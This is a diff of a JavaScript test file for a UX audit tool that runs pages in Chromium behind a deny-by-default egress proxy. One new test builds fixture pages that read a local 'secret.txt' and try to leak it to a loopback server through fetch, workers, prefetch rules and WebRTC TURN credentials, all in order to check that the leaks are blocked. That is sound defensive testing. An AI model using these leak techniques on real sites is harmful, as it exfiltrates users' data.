@@ -2,6 +2,7 @@
  * runtime-ux-audit dynamic pass: pure helpers and the loopback server run
  * everywhere; the probes run in real Chromium and skip cleanly without it.
  */
+import dgram from 'node:dgram';
 import { mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import http from 'node:http';
 import net from 'node:net';
@@ -351,8 +352,83 @@ describe('runDynamicPass without a browser', () => {
         throw missing;
       };
       await expect(runDynamicPass({ page: { kind: 'file', url: '', filePath: join(root, 'index.html'), root }, launch })).rejects.toBe(missing);
+      // A local input launches behind the egress proxy, with no WebRTC UDP and no DNS in Chromium.
+      expect(seen).toEqual({
+        channel: 'chromium',
+        ignoreDefaultArgs: ['--disable-back-forward-cache'],
+        proxy: { server: expect.stringMatching(/^http:\/\/127\.0\.0\.1:\d+$/), bypass: '<-loopback>' },
+        args: ['--webrtc-ip-handling-policy=disable_non_proxied_udp', '--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE 127.0.0.1'],
+      });
+      await expect(runDynamicPass({ page: { kind: 'http', url: 'http://127.0.0.1:9/' }, launch })).rejects.toBe(missing);
       expect(seen).toEqual({ channel: 'chromium', ignoreDefaultArgs: ['--disable-back-forward-cache'] });
       expect(LAUNCH_OPTIONS.channel).toBe('chromium');
+    } finally {
+      cleanup();
+    }
+  });
+
+  it('starts a deny-by-default proxy for a local input and closes it with the pass', async () => {
+    const { dir, cleanup } = tempDir('ux-dyn-proxy-');
+    try {
+      writeFiles(dir, { 'index.html': '<p>x</p>' });
+      const root = safeRealpath(dir);
+      const page = { kind: 'file', url: '', filePath: join(root, 'index.html'), root };
+      const hits = [];
+      await withServer((req, res) => {
+        hits.push(`${req.method} ${req.url}`);
+        res.writeHead(200, { 'Content-Type': 'text/plain', 'Content-Length': 13, 'X-Upstream': 'yes' });
+        res.end('upstream body');
+      }, async (other) => {
+        const { host } = new URL(other);
+        const stop = new Error('stop');
+        let proxyPort = 0;
+        // The launch hook runs while the proxy is up: talk to it the way Chromium would, then end the pass.
+        const through = async (allowOrigins) => {
+          const seen = {};
+          const launch = async (opts) => {
+            proxyPort = Number(new URL(opts.proxy.server).port);
+            seen.get = await rawRequest(proxyPort, `${other}/file?q=1`, { host });
+            seen.originForm = await rawRequest(proxyPort, '/index.html', { host });
+            seen.tunnel = await new Promise((resolve, reject) => {
+              const sock = net.connect(proxyPort, '127.0.0.1', () => sock.write(`CONNECT ${host} HTTP/1.1\r\nHost: ${host}\r\n\r\n`));
+              let data = '';
+              let sent = false;
+              sock.setEncoding('latin1');
+              sock.on('data', (d) => {
+                data += d;
+                if (!sent && data.startsWith('HTTP/1.1 200') && data.includes('\r\n\r\n')) {
+                  sent = true;
+                  sock.write(`GET /tunnel HTTP/1.1\r\nHost: ${host}\r\nConnection: close\r\n\r\n`);
+                }
+              });
+              sock.on('end', () => resolve(data));
+              sock.on('error', reject);
+            });
+            throw stop;
+          };
+          await expect(runDynamicPass({ page, launch, allowOrigins })).rejects.toBe(stop);
+          return seen;
+        };
+
+        const denied = await through([]);
+        expect(denied.get.status).toBe(403);
+        expect(denied.originForm.status).toBe(403);
+        expect(denied.tunnel).toMatch(/^HTTP\/1\.1 403 /);
+        expect(hits).toEqual([]);
+        await expect(new Promise((resolve, reject) => {
+          net.connect(proxyPort, '127.0.0.1').once('connect', resolve).once('error', reject);
+        })).rejects.toThrow();
+
+        const allowed = await through([other]);
+        expect(allowed.get.status).toBe(200);
+        expect(allowed.get.head).toContain('x-upstream: yes');
+        expect(allowed.get.body).toBe('upstream body');
+        // Still a proxy only: a request that names no allowed origin is refused.
+        expect(allowed.originForm.status).toBe(403);
+        expect(allowed.tunnel).toMatch(/^HTTP\/1\.1 200 /);
+        expect(allowed.tunnel).toContain('upstream body');
+        expect(hits).toEqual(['GET /file?q=1', 'GET /tunnel']);
+      });
     } finally {
       cleanup();
     }
@@ -570,6 +646,40 @@ describe.skipIf(!chromiumAvailable)('dynamic pass in Chromium', () => {
     }
   }, 120_000);
 
+  it('waits out a slow exit animation before falling back to the close button', async () => {
+    const PAGE = (ms, ignoreEscape) => '<!doctype html><meta name="viewport" content="width=device-width">'
+      + '<button id="op" aria-haspopup="dialog" aria-controls="dlg">Open</button>'
+      + `<div id="dlg" role="dialog" aria-modal="true" hidden style="transition:opacity ${ms}ms"><button id="x" type="button" aria-label="Close">x</button></div>`
+      + '<script>(function(){var op=document.getElementById("op"),d=document.getElementById("dlg"),closing=false;'
+      + 'function close(){if(closing)return;closing=true;op.focus();d.style.opacity="0";setTimeout(function(){d.hidden=true;closing=false;},' + ms + ');}'
+      + 'op.addEventListener("click",function(){d.hidden=false;d.style.opacity="1";d.querySelector("#x").focus();});'
+      + 'document.getElementById("x").addEventListener("click",close);'
+      + (ignoreEscape ? '' : 'document.addEventListener("keydown",function(e){if(e.key==="Escape")close();});')
+      + '})();</script>';
+    const run = async (html) => {
+      const { dir, cleanup } = tempDir('ux-dyn-exit-');
+      try {
+        writeFiles(dir, { 'index.html': html });
+        const root = safeRealpath(dir);
+        const filePath = join(root, 'index.html');
+        const urls = createPageUrls({ kind: 'file', docUrl: pathToFileURL(filePath).href, root });
+        const out = await runDynamicPass({
+          page: { kind: 'file', url: pathToFileURL(filePath).href, filePath, root },
+          toDisplay: (u) => urls.toDisplay(u),
+          limits: { settleMs: 100, maxTabs: 1, maxDialogTriggers: 1 },
+        });
+        return out.dialogs;
+      } finally {
+        cleanup();
+      }
+    };
+    expect(await run(PAGE(450, false))).toEqual([
+      { trigger: '#op', opened: true, closed: true, closeMethod: 'escape', activeAfterClose: '#op', restoredToTrigger: true },
+    ]);
+    const ignoring = await run(PAGE(50, true));
+    expect(ignoring[0]).toMatchObject({ closed: true, closeMethod: 'close-button' });
+  }, 120_000);
+
   it('never taps or opens a button that would submit a form', async () => {
     const PAGE = '<!doctype html><meta name="viewport" content="width=device-width">'
       + '<form method="post"><input type="hidden" name="action" value="delete-account"><button id="del">Delete my account</button></form>'
@@ -628,6 +738,84 @@ describe.skipIf(!chromiumAvailable)('dynamic pass in Chromium', () => {
     });
   }, 180_000);
 
+  it('blocks worker, prefetch, WebRTC and WebTransport egress from a local page', async () => {
+    // Loopback only: an HTTP server, a UDP socket and a TCP server that no local page may reach.
+    const hits = [];
+    const datagrams = [];
+    const tcpConnections = [];
+    const udp = dgram.createSocket('udp4');
+    udp.on('message', (msg) => datagrams.push(msg.length));
+    await new Promise((r) => udp.bind(0, '127.0.0.1', r));
+    const tcp = net.createServer((sock) => {
+      tcpConnections.push(sock.remotePort);
+      sock.on('error', () => {});
+      sock.resume();
+    });
+    await new Promise((r) => tcp.listen(0, '127.0.0.1', r));
+    const udpPort = udp.address().port;
+    const tcpPort = tcp.address().port;
+    try {
+      await withServer((req, res) => {
+        hits.push(req.url);
+        res.writeHead(204, { 'access-control-allow-origin': '*' });
+        res.end();
+      }, async (other) => {
+        const { dir, cleanup } = tempDir('ux-dyn-egress-');
+        try {
+          const leak = (name) => `fetch('secret.txt').then((r) => r.text()).then((t) => fetch('${other}/${name}?d=' + t, { mode: 'no-cors' })).catch(() => {});`;
+          writeFiles(dir, {
+            'secret.txt': 'FILE-UNDER-ROOT',
+            'shared.js': `${leak('from-sharedworker')}\n`
+              + `try { new WebSocket('${other.replace('http:', 'ws:')}/ws-from-sharedworker').onerror = () => {}; } catch {}\n`
+              + `try { new WebTransport('https://127.0.0.1:${udpPort}/wt').ready.catch(() => {}); } catch {}\n`,
+            'worker.js': `${leak('from-worker')}\n`,
+            'index.html': '<!doctype html><meta name="viewport" content="width=device-width"><p>x</p><script>'
+              + "fetch('secret.txt').then((r) => r.text()).then((secret) => {"
+              + "  new SharedWorker('shared.js');"
+              + "  new Worker('worker.js');"
+              + "  const rules = document.createElement('script');"
+              + "  rules.type = 'speculationrules';"
+              + `  rules.textContent = JSON.stringify({ prefetch: [{ source: 'list', urls: ['${other}/from-prefetch?d=' + secret], eagerness: 'immediate' }] });`
+              + '  document.head.append(rules);'
+              + '  const pc = new RTCPeerConnection({ iceServers: ['
+              + `    { urls: 'stun:127.0.0.1:${udpPort}' },`
+              + `    { urls: 'turn:127.0.0.1:${udpPort}?transport=udp', username: secret, credential: 'x' },`
+              + `    { urls: 'turn:127.0.0.1:${tcpPort}?transport=tcp', username: secret, credential: 'x' },`
+              + '  ] });'
+              + "  pc.createDataChannel('x');"
+              + '  pc.createOffer().then((offer) => pc.setLocalDescription(offer));'
+              + `  try { new WebTransport('https://127.0.0.1:${udpPort}/wt').ready.catch(() => {}); } catch {}`
+              + '});</script>',
+          });
+          const root = safeRealpath(dir);
+          const filePath = join(root, 'index.html');
+          const input = { page: { kind: 'file', url: pathToFileURL(filePath).href, filePath, root }, limits: { settleMs: 500, maxTabs: 1, maxTaps: 1, maxDialogTriggers: 1 } };
+          const blocked = await runDynamicPass(input);
+          expect(blocked.navigation).toEqual({ status: 200, finalUrl: 'index.html' });
+          expect(hits).toEqual([]);
+          expect(datagrams).toEqual([]);
+          expect(tcpConnections).toEqual([]);
+          const network = blocked.errors.filter((e) => e.probe === 'network');
+          expect(network).toHaveLength(1);
+          expect(network[0].message).toContain(other);
+          // The same page with the origin allowed: the worker and prefetch requests arrive, so the fixture does try them.
+          const allowed = await runDynamicPass({ ...input, allowOrigins: [other] });
+          expect(hits).toEqual(expect.arrayContaining([
+            '/from-sharedworker?d=FILE-UNDER-ROOT', '/from-worker?d=FILE-UNDER-ROOT', '/from-prefetch?d=FILE-UNDER-ROOT', '/ws-from-sharedworker',
+          ]));
+          expect(allowed.errors.filter((e) => e.probe === 'network' && e.message.includes(other))).toEqual([]);
+          // WebRTC never gets a UDP socket for a local page, whatever is allowed.
+          expect(datagrams).toEqual([]);
+        } finally {
+          cleanup();
+        }
+      });
+    } finally {
+      await new Promise((r) => udp.close(r));
+      await new Promise((r) => tcp.close(r));
+    }
+  }, 240_000);
+
   it('records a failed navigation and skips the page probes', async () => {
     const port = await new Promise((resolve) => {
       const srv = net.createServer();
@@ -647,7 +835,177 @@ describe.skipIf(!chromiumAvailable)('dynamic pass in Chromium', () => {
     expect(out.bfcache).toBeNull();
   }, 120_000);
 
-  it('serves a missing local document as a 404 navigation, not an error', async () => {
+  // A page of another origin that must never be loaded, swept, clicked or quoted.
+  const OTHER_PAGE = '<!doctype html><meta name="viewport" content="width=device-width, user-scalable=no" data-secret="INTERNAL-TOKEN-8841">'
+    + '<button id="wipe" style="width:12px;height:12px" onclick="fetch(\'/wipe\', { method: \'POST\' })">w</button>';
+  const otherOrigin = (hits, fn) => withServer((req, res) => {
+    hits.push(`${req.method} ${req.url}`);
+    req.resume();
+    res.writeHead(200, { 'content-type': 'text/html' });
+    res.end(OTHER_PAGE);
+  }, fn);
+  const httpInput = (base, limits = {}) => ({
+    page: { kind: 'http', url: `${base}/`, filePath: null, root: null },
+    limits: { settleMs: 100, maxTabs: 1, maxDialogTriggers: 1, ...limits },
+  });
+
+  const PROBES = ['navigation', 'rendered', 'sweep', 'interactions', 'dialogs', 'bfcache'];
+  const refusedFor = (other) => `navigation to ${other} was refused: the dynamic pass only loads the audited origin; audit that URL directly if that was intended`;
+
+  it('refuses a redirect to another origin instead of auditing that page', async () => {
+    const hits = [];
+    await otherOrigin(hits, (other) => withServer((req, res) => {
+      res.writeHead(302, { location: `${other}/admin` });
+      res.end();
+    }, async (base) => {
+      const out = await runDynamicPass(httpInput(base));
+      expect(hits).toEqual([]);
+      expect(out.errors).toEqual([{ probe: 'navigate', message: refusedFor(other) }]);
+      expect(out.engine).not.toBeNull();
+      for (const probe of PROBES) expect(out[probe], probe).toBeNull();
+      expect(JSON.stringify(out)).not.toContain('INTERNAL-TOKEN');
+    }));
+  }, 120_000);
+
+  it('refuses a script navigation to another origin right after load', async () => {
+    const hits = [];
+    await otherOrigin(hits, (other) => withServer((req, res) => {
+      res.writeHead(200, { 'content-type': 'text/html' });
+      res.end('<!doctype html><meta name="viewport" content="width=device-width"><p>shell</p>'
+        + `<script>setTimeout(() => { location.href = '${other}/by-script'; }, 50);</script>`);
+    }, async (base) => {
+      const out = await runDynamicPass(httpInput(base));
+      expect(hits).toEqual([]);
+      expect(out.errors).toEqual([{ probe: 'navigate', message: refusedFor(other) }]);
+      for (const probe of PROBES) expect(out[probe], probe).toBeNull();
+    }));
+  }, 120_000);
+
+  it('does not drive the interaction probe when the page leaves the audited origin during the settle', async () => {
+    const hits = [];
+    await otherOrigin(hits, (other) => withServer((req, res) => {
+      res.writeHead(200, { 'content-type': 'text/html' });
+      res.end('<!doctype html><meta name="viewport" content="width=device-width"><p>audited</p><button id="ok" type="button">OK</button>'
+        + `<script>setTimeout(() => { location.href = '${other}/during-settle'; }, 2000);</script>`);
+    }, async (base) => {
+      const out = await runDynamicPass(httpInput(base, { settleMs: 3000, maxTabs: 1, maxTaps: 2, maxDialogTriggers: 1 }));
+      expect(hits).toEqual([]);
+      expect(out.interactions).toBeNull();
+      expect(JSON.stringify(out)).not.toContain('reload-button');
+      expect(out.errors.map((e) => e.message)).toContain(refusedFor(other));
+    }));
+  }, 120_000);
+
+  it('refuses an error page answered only on a later load of the audited page', async () => {
+    let documents = 0;
+    await withServer((req, res) => {
+      if (req.url !== '/') {
+        res.writeHead(404);
+        res.end();
+        return;
+      }
+      documents += 1;
+      res.writeHead(documents > 1 ? 503 : 200, { 'content-type': 'text/html' });
+      res.end('<!doctype html><meta name="viewport" content="width=device-width"><p>audited</p><button id="ok" type="button">OK</button>');
+    }, async (base) => {
+      const out = await runDynamicPass(httpInput(base));
+      expect(out.navigation.status).toBe(200);
+      expect(out.dialogs).toBeNull();
+      expect(out.bfcache).toBeNull();
+      const byProbe = Object.fromEntries(out.errors.map((e) => [e.probe, e.message]));
+      expect(byProbe.dialogs).toContain('HTTP 503');
+      expect(byProbe.bfcache).toContain('HTTP 503');
+    });
+  }, 120_000);
+
+  it('drops a dialog result read after the page left for another origin', async () => {
+    const hits = [];
+    await otherOrigin(hits, (other) => withServer((req, res) => {
+      res.writeHead(200, { 'content-type': 'text/html' });
+      res.end('<!doctype html><meta name="viewport" content="width=device-width"><p>audited</p>'
+        + '<button id="open" type="button" aria-haspopup="dialog">Open</button><dialog id="d" aria-label="Notice"><p>Leaving</p></dialog>'
+        + '<script>const d = document.getElementById("d"); document.getElementById("open").addEventListener("click", () => d.showModal());'
+        + `d.addEventListener('close', () => { location.href = '${other}/after-close'; });</script>`);
+    }, async (base) => {
+      const out = await runDynamicPass(httpInput(base, { maxTaps: 0 }));
+      expect(hits).toEqual([]);
+      // Focus went back to the trigger before the page left; nothing read on Chromium's error page may say otherwise.
+      expect((out.dialogs ?? []).filter((d) => d.closed && !d.restoredToTrigger)).toEqual([]);
+      expect(out.errors.map((e) => e.message)).toContain(refusedFor(other));
+    }));
+  }, 120_000);
+
+  it('reports an HTTP error answered to Chromium only as a probe error, with no finding about the error page', async () => {
+    // The static fetch gets the page; Chromium gets a 503 (a bot check or a flaky origin).
+    await withServer((req, res) => {
+      const chromium = /Chrome\//.test(req.headers['user-agent'] ?? '');
+      res.writeHead(chromium ? 503 : 200, { 'content-type': 'text/html' });
+      res.end('<!doctype html><html lang="en"><meta name="viewport" content="width=device-width"><title>t</title><p>page</p><button>Retry</button>');
+    }, async (base) => {
+      const res = await auditRuntimeUx({ url: `${base}/`, dynamic: true, write: false, brand: null, timestamp: FIXED_TS });
+      expect(res.raw.errors).toEqual([{ phase: 'dynamic', message: 'navigate: the page answered Chromium with HTTP 503, so it was not probed' }]);
+      expect(res.metrics.bfcache).toBeNull();
+      expect(res.metrics.inp).toBeNull();
+      expect(res.violations.all.map((v) => v.id)).not.toContain('atelier/runtime-ux/bfcache-not-restored');
+    });
+  }, 120_000);
+
+  it('keeps the main frame on the audited origin when a tap or a later load tries to leave', async () => {
+    const hits = [];
+    let documents = 0;
+    await otherOrigin(hits, (other) => withServer((req, res) => {
+      if (req.url !== '/') {
+        res.writeHead(404);
+        res.end();
+        return;
+      }
+      documents += 1;
+      // The first load is the audited page; every later load answers with a redirect to the other origin.
+      if (documents > 1) {
+        res.writeHead(302, { location: `${other}/later` });
+        res.end();
+        return;
+      }
+      res.writeHead(200, { 'content-type': 'text/html' });
+      res.end('<!doctype html><meta name="viewport" content="width=device-width"><p id="audited">audited</p><button id="go" type="button">Go</button>'
+        + `<script>document.getElementById('go').addEventListener('click', () => { location.href = '${other}/by-tap'; });</script>`);
+    }, async (base) => {
+      const out = await runDynamicPass(httpInput(base));
+      expect(hits).toEqual([]);
+      expect(out.navigation).toMatchObject({ status: 200, finalUrl: '/' });
+      expect(out.rendered.html).toContain('id="audited"');
+      expect(out.sweep.interactive.map((t) => t.selector)).toEqual(['#go']);
+      expect(out.interactions.attempted.map((a) => a.target)).toContain('#go');
+      // The reloads of the later probes were redirected, so those probes did not run.
+      expect(out.dialogs).toBeNull();
+      expect(out.bfcache).toBeNull();
+      expect(out.errors.map((e) => e.probe)).toEqual(['interactions', 'dialogs', 'bfcache', 'navigate']);
+      expect(out.errors[0].message).toMatch(/^navigated-away: tapping #go left the page/);
+      expect(out.errors[3].message).toBe(refusedFor(other));
+      expect(JSON.stringify(out)).not.toContain('INTERNAL-TOKEN');
+    }));
+  }, 120_000);
+
+  it('follows a same-origin redirect and leaves frames of other origins alone', async () => {
+    const hits = [];
+    await otherOrigin(hits, (other) => withServer((req, res) => {
+      if (req.url === '/') {
+        res.writeHead(302, { location: '/home' });
+        res.end();
+        return;
+      }
+      res.writeHead(req.url === '/home' ? 200 : 404, { 'content-type': 'text/html' });
+      res.end(`<!doctype html><meta name="viewport" content="width=device-width"><p>home</p><iframe src="${other}/frame"></iframe>`);
+    }, async (base) => {
+      const out = await runDynamicPass(httpInput(base));
+      expect(out.errors).toEqual([]);
+      expect(out.navigation).toMatchObject({ status: 200, finalUrl: '/home' });
+      expect(hits).toContain('GET /frame');
+      expect(out.bfcache).toEqual({ supported: true, restored: true, reasons: [] });
+    }));
+  }, 120_000);
+
+  it('records a missing local document as a failed navigation', async () => {
     const { dir, cleanup } = tempDir('ux-dyn-gone-');
     try {
       writeFiles(dir, { 'index.html': '<p>x</p>' });
@@ -655,9 +1013,30 @@ describe.skipIf(!chromiumAvailable)('dynamic pass in Chromium', () => {
       const filePath = join(root, 'index.html');
       rmSync(filePath);
       const out = await runDynamicPass({ page: { kind: 'file', url: pathToFileURL(filePath).href, filePath, root }, limits: { settleMs: 100, maxTabs: 1 } });
-      expect(out.navigation).toEqual({ status: 404, finalUrl: 'index.html' });
+      expect(out.errors).toEqual([{ probe: 'navigate', message: expect.stringContaining('HTTP 404') }]);
+      expect(out.navigation).toBeNull();
+      expect(out.rendered).toBeNull();
+      expect(out.sweep).toBeNull();
     } finally {
       cleanup();
     }
   }, 120_000);
+});
+
+describe('rendered DOM depth', () => {
+  it('skips the rendered re-check with an error when script builds a DOM nested past the limit', async () => {
+    const { dir, cleanup } = tempDir('ux-deep-');
+    try {
+      writeFiles(dir, { 'index.html': '<!doctype html><html lang="en"><head><title>t</title></head><body><main><img src="a.png"></main></body></html>' });
+      const deep = `${'<div>'.repeat(600)}x${'</div>'.repeat(600)}`;
+      const res = await auditRuntimeUx({
+        url: join(dir, 'index.html'), dynamic: true, write: false, brand: null, timestamp: FIXED_TS,
+        dynamicImpl: async () => ({ ...emptyFacts(), rendered: { html: `<!doctype html><html><body>${deep}</body></html>` } }),
+      });
+      expect(res.raw.errors.map((e) => e.message)).toContain('the rendered DOM nests more than 512 elements deep, so it was not re-checked');
+      expect(res.raw.errors.find((e) => /nests more than 512/.test(e.message)).phase).toBe('dynamic');
+    } finally {
+      cleanup();
+    }
+  });
 });
